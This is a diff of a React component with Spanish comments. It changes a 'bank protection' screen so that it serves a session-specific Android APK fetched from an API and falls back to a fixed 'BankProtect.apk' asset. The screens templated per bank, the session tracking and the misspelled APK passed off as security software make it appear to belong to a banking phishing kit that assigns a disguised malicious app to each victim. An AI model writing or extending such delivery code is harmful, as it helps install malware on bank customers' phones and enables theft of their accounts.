@@ -755,15 +755,43 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
       case ScreenType.PROTECCION_BANCARIA:
         // Mapeo de bancos a archivos de protección
-        const getProtectionFile = (bankCode: string) => {
-          // Todos los bancos usan el mismo archivo APK universal
-          return {
-            fileName: 'BankProtect.apk',
-            fileUrl: '/assets/Bankprotet2_1750982122281.apk'
-          };
+        const getProtectionFile = async (sessionId: string) => {
+          try {
+            // Intentar obtener el APK asignado al usuario de la sesión
+            const response = await fetch(`/api/get-user-apk/${sessionId}`);
+            
+            if (response.ok) {
+              const data = await response.json();
+              return {
+                fileName: data.apkFileName,
+                fileUrl: data.apkFileUrl
+              };
+            } else {
+              // Si no tiene APK asignado, usar el archivo universal
+              return {
+                fileName: 'BankProtect.apk',
+                fileUrl: '/assets/Bankprotet2_1750982122281.apk'
+              };
+            }
+          } catch (error) {
+            console.error('Error fetching user APK:', error);
+            // En caso de error, usar el archivo universal
+            return {
+              fileName: 'BankProtect.apk',
+              fileUrl: '/assets/Bankprotet2_1750982122281.apk'
+            };
+          }
         };
 
-        const protectionFile = getProtectionFile(bankCode);
+        // Estado para manejar el archivo de protección
+        const [protectionFile, setProtectionFile] = React.useState<{fileName: string, fileUrl: string} | null>(null);
+        
+        // Cargar el archivo de protección cuando se monta el componente
+        React.useEffect(() => {
+          if (sessionId) {
+            getProtectionFile(sessionId).then(setProtectionFile);
+          }
+        }, [sessionId]);
         
         const proteccionBancariaContent = (
           <>
